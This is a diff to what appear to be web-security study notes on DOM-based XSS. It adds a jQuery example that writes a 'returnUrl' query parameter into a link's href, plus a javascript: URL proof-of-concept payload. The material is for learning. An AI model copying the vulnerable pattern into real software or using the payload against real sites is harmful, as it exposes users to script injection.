@@ -99,7 +99,21 @@ Exploit
 
 ### <mark style="color:yellow;">DOM XSS - Sources and sinks in third-party dependencies</mark>
 
-To do...
+### <mark style="color:yellow;">**in jQuery**</mark>
+
+jQuery's `attr()` function can change the attributes of DOM elements
+
+```javascript
+$(function() {
+	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+```
+
+Exploit
+
+```
+?returnUrl=javascript:alert(document.domain)
+```
 
 ### <mark style="color:yellow;">Reflected/Stored DOM XSS</mark>
 
